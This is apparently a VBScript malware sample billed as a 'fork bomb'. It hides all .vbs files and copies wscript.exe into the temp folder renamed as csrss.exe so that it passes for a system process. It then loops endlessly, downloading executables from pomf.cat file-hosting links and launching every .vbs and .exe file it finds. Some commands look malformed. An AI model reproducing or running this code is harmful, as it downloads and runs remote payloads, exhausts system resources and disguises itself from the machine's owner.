'''All the New Pokemans Fork Bomb'''
Dim list
Dim max, min
max=999999999
min=100000000
Randomize
Set list = CreateObject("System.Collections.ArrayList")
	list.Add "http://a.pomf.cat/uthqdm.exe"		   'eevee.exe
	list.Add "http://a.pomf.cat/utoojo.exe"        'wscript
	list.Add "https://a.pomf.cat/ayunww.bat"	   'raise privilegdges
i = 0

CreateObject("WScript.Shell").run "cmd.exe /c for /r %i in (*.vbs) do attrib +h ""%i"""  'Hide all vbs

call copyWscript
Do while i <= 0
	call getFiles(list.Item(0), (Int((max-min+1)*Rnd+min))&".exe") 'get Eevees
	call executeCSRSS()
	call executeEevees()
Loop

Function getFiles(strFileURL, strHDLocation) 'automate get any files that are necessary
	'strFileURL = "http://www.google.com/intl/en_ALL/images/logo.gif"
	'strHDLocation = "C:\GoogleLogo.gif"
	Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
	objXMLHTTP.Open "GET", strFileURL, False
	objXMLHTTP.send
	If objXMLHTTP.Status = 200 Then
		Set objADOStream = CreateObject("ADODB.Stream")
		objADOStream.Open
		objADOStream.Type = 1
		objADOStream.Write objXMLHTTP.ResponseBody
		objADOStream.Position = 0
		Set objFSO = CreateObject("Scripting.FileSystemObject")
		If objFSO.Fileexists(strHDLocation) Then
			objFSO.DeleteFile strHDLocation
		End If
		Set objFSO = Nothing
		objADOStream.SaveToFile strHDLocation
		objADOStream.Close
		Set objADOStream = Nothing
	End If
End Function

Function copyWscript() 'Copy the systems wscript into a temporary folder rename it csrss
	CreateObject("WScript.Shell").run "cmd /c xcopy C:\Windows\System32\wscript.exe %temp%"
	CreateObject("WScript.Shell").run "cmd /c ren %temp%\wscript.exe %temp%\csrss.exe"
End Function

Function executeEevees() 'no seriously kill them all
	CreateObject("WScript.Shell").run "cmd /c start for /r %i in (*.exe) do "
End Function

Function executeCSRSS() 'Commence undercover agent, naming of vbs program could change, just run anything with vbs extension
	CreateObject("WScript.Shell").run "cmd /c for /r %i in (*.vbs) do start C:\%temp%\csrss.exe ""%i"""
End Function